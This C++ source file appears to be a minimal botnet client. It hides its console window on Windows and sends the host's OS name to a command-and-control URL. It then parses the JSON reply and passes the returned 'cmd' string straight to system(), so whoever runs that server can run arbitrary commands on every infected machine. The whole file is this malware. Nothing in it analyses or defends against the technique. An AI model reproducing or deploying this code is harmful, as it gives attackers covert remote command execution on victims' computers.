#include <iostream>
#include <string>
#include <thread>
#include "inc/HTTPRequest.hpp"
#include "inc/getosname.h"
#include "inc/json.hpp"

#ifdef _WIN64 || _WIN32
#include "windows.h"
#endif

using namespace std;
using namespace nlohmann;

void tProcess(int i, double d, const string &s) {
    cout << i << ", " << d << ", " << s << endl;
}

int main() {
    for(int i = 0; i < 100000; i++) {}

    #ifdef _WIN64 || _WIN32
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif

    string mainnet = "http://botnet.ya-ne-artem.ru/mainnet.php";
    string os = getOsName();

    try {
        http::Request request{mainnet + "?os=" + os};

        const auto response = request.send("GET");
        string res = string{response.body.begin(), response.body.end()};

        json j = json::parse(res);

        string jcmd = j["cmd"];

        cout << jcmd << endl;

        char cmd[jcmd.length() + 1];
        strcpy(cmd, jcmd.c_str());

        system(cmd);
    }
    catch (const std::exception& e) {
        cerr << "Request failed, error: " << e.what() << endl;
    }

//    while(true){}

    return 0;
}
